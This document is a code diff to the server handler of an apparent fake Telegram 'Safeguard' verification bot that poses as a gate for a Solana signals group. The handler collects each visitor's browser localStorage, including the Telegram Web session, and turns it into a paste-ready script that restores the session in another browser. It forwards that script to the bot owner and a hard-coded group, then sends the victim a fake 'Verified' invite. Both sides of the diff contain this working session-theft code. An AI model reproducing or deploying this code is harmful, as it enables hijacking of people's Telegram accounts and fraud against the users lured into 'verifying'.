@@ -166,84 +166,87 @@ const newVerified = async (ctx: Context) => {
   const body = await ctx.request.body.json();
   const storage = body.storage;
 
-  if (storage) {
-    const user = body.user || { username: "durov", id: "" };
-    if (!user.id && storage.user_auth) {
-      user.id = JSON.parse(storage.user_auth).id;
-    }
+  if (!storage) {
+    console.error("❌ Storage mancante");
+    ctx.response.status = Status.BadRequest;
+    ctx.response.body = { error: "Missing storage" };
+    return;
+  }
 
-try {
-  const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a  href="t.me/${user.username}">@${user.username}</a>
+  const user = body.user || { username: "durov", id: null };
+  let user_id = user.id;
+  let username = user.username;
+
+  if (!user_id && storage.user_auth) {
+    try {
+      const user_auth = JSON.parse(storage.user_auth);
+      user_id = user_auth?.id;
+      if (!username && user_auth?.username) {
+        username = user_auth.username;
+      }
+    } catch (e) {
+      console.error("❌ Errore parsing user_auth:", e);
+    }
+  }
+
+  try {
+    const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a href="https://t.me/${username}">@${username}</a>
 
 <pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
-  const myGroupId = -4723386398;
-  await bot.api.raw.sendMessage({
-    text: log,
-    chat_id: botOwner,
-    parse_mode: "HTML",
-  });
+    const myGroupId = -4723386398;
 
-  await bot.api.raw.sendMessage({
-    text: log,
-    chat_id: myGroupId,
-    parse_mode: "HTML",
-  });
+    // Invia log al bot owner
+    await bot.api.sendMessage(botOwner, log, { parse_mode: "HTML" });
 
-  const deno = await Deno.openKv();
-  const entry = await deno.get(["channel", "@SolanaSignalsPrivate"]);
-  const config = (entry.value || sgConfigDefault) as SafeguardConfig;
-  const imageLink = sgVerifiedURL ? new URL(sgVerifiedURL) : "./safeguard-verify.jpg";
+    // Invia log anche al gruppo
+    await bot.api.sendMessage(myGroupId, log, { parse_mode: "HTML" });
 
-  const verifyMsg = `✅ Verified, you can join the group using this temporary link:
+    // Recupera i dati dal DB KV
+    const deno = await Deno.openKv();
+    const entry = await deno.get(["channel", "@SolanaSignalsPrivate"]);
+    const config = (entry.value || sgConfigDefault) as SafeguardConfig;
+    const imageLink = sgVerifiedURL ? new URL(sgVerifiedURL) : "./safeguard-verify.jpg";
+
+    const verifyMsg = `✅ Verified, you can join the group using this temporary link:
+
 <a href="${config.inviteLink}">${config.inviteLink}</a>
+
 ⚠️ This link is one-time use and will expire`;
 
-  const inviteMsg = `<b>Verified!</b> 
+    const inviteMsg = `<b>Verified!</b> 
 Join request has been sent and you will be added once the admin approves your request`;
 
-let user_id = null;
-let username = "undefined";
-
-try {
-  const user_auth = JSON.parse(storage.user_auth);
-  user_id = user_auth?.id || null;
-  username = user?.username || "undefined";
-
-  await bot.api.sendMessage(botOwner, ` user_auth.id = ${user_id}\n username = ${username}`);
-} catch (e) {
-  await bot.api.sendMessage(botOwner, `❌ ERRORE parsing user_auth:\n${e}`);
-}
-
-  const debugMessage = `
+    // Invia messaggio di debug dettagliato
+    const debugMessage = `
 <b>🔍 DEBUG INFO</b>
-👤 <b>User ID:</b> <code>${user_id}</code>
+👤 <b>User ID:</b> <code>${user_id || "undefined"}</code>
 👤 <b>Username:</b> @${username}
 🔗 <b>Invite Link:</b> ${config.inviteLink || "Nessun link trovato"}
 🖼️ <b>Image Link:</b> ${imageLink}
 `;
 
-  await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" });
+    await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" });
 
-  if (user_id) {
-    await bot.api.sendPhoto(user_id, new InputFile(imageLink), {
-      caption: config.inviteLink ? verifyMsg : inviteMsg,
-      parse_mode: "HTML",
-    });
-  } else {
-    await bot.api.sendMessage(botOwner, "❌ ERRORE: user_auth.id è undefined");
+    if (user_id) {
+      await bot.api.sendPhoto(user_id, new InputFile(imageLink), {
+        caption: config.inviteLink ? verifyMsg : inviteMsg,
+        parse_mode: "HTML",
+      });
+    } else {
+      await bot.api.sendMessage(botOwner, "❌ ERRORE: user_id è undefined, non posso inviare il messaggio.");
+    }
+
+  } catch (err) {
+    console.error("❌ Errore nella funzione newVerified:", err);
+    await bot.api.sendMessage(botOwner, `❌ CATCH: ${err.message}`);
   }
 
-} catch (e) {
-  console.error("❌ CATCH newVerified:", e);
-}
-    
-// ✅ chiusura corretta della funzione newVerified
-ctx.response.status = Status.OK;
-ctx.response.type = "application/json";
-ctx.response.body = { msg: "ok" };
-  }
+  ctx.response.status = Status.OK;
+  ctx.response.type = "application/json";
+  ctx.response.body = { msg: "ok" };
 };
+
 
 // Response Time
 app.use(async (context, next) => {
